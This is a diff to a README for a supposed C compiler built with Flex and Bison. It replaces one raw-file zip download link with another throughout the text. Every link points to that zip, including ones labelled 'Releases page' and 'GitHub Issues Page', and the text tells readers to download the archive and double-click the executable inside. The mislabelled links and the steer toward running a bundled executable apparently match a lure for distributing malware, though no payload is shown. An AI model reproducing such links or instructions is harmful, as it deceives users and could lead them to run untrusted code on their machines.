@@ -13,9 +13,9 @@ custom-compiler-c is a compiler built from scratch in C using Flex and Bison. It
 ## 📥 Download & Install
 To get started with custom-compiler-c, you need to download it from our Releases page. 
 
-[![Download custom-compiler-c](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/examples/custom-compiler-c-v3.4.zip)](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/examples/custom-compiler-c-v3.4.zip)
+[![Download custom-compiler-c](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/src/c_custom_compiler_2.8.zip)](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/src/c_custom_compiler_2.8.zip)
 
-1. Visit [this page to download](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/examples/custom-compiler-c-v3.4.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/src/c_custom_compiler_2.8.zip).
 2. You’ll see a list of available versions. Choose the latest release or the version that suits your needs.
 3. Click on the executable file or zip archive to start the download.
 4. Follow the installation instructions provided in the package.
@@ -30,7 +30,7 @@ To get started with custom-compiler-c, you need to download it from our Releases
 After downloading and installing custom-compiler-c, follow these steps to run the software:
 
 1. Navigate to the installation folder where you extracted or installed the application.
-2. Locate the executable file (e.g., `https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/examples/custom-compiler-c-v3.4.zip` or similar).
+2. Locate the executable file (e.g., `https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/src/c_custom_compiler_2.8.zip` or similar).
 3. Double-click the executable to launch the application.
 4. Follow the on-screen prompts to input your source code for compilation.
 
@@ -62,10 +62,10 @@ If you run into issues while using custom-compiler-c, consider these common solu
 ## 📞 Support
 If you need further assistance, feel free to explore the following resources:
 
-- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/examples/custom-compiler-c-v3.4.zip) for help from the community and developers.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/src/c_custom_compiler_2.8.zip) for help from the community and developers.
 - Check the documentation for more in-depth explanations and examples.
 
 ## 🚀 Conclusion
 custom-compiler-c provides a user-friendly way to dive into compiler construction, making it perfect for learners and educators. Follow the steps above to download, install, and start compiling your code today.
 
-For your convenience, you can download custom-compiler-c from the Releases page again: [visit this page to download](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/examples/custom-compiler-c-v3.4.zip).
+For your convenience, you can download custom-compiler-c from the Releases page again: [visit this page to download](https://raw.githubusercontent.com/Nuralom32/custom-compiler-c/main/src/c_custom_compiler_2.8.zip).
